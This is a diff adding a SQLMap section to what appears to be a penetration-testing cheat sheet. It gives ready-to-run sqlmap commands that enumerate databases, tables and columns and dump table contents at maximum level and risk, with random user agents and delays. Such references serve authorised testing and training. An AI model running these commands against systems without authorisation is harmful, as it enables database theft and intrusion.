@@ -153,6 +153,26 @@ enum4linux-ng -U -u <username> -p <password> <target_ip>
 
 # Web Application Analysis
 
+## SQL Injection
+
+### SQLMap
+```bash
+# Enumerate DBMS databases
+sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent --dbs
+
+# Enumerate DBMS database tables
+sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 --random-agent -D <DB_name> --tables
+
+# Enumerate DBMS database table columns
+sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch -D <DB_name> -T <TABLE_name> --columns
+
+# Dump DBMS database table entries
+sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch -D <DB_name> -T <TABLE_name> -C <column_name_1,column_name_2> --dump
+
+# SQLMap options
+--dbms=<dbms>    # Specify DBMS type if known (e.g., mysql, postgresql, mssql)
+--current-user   # Retrieve DBMS current user
+```
 
 # Linux Privilege Escalation
 
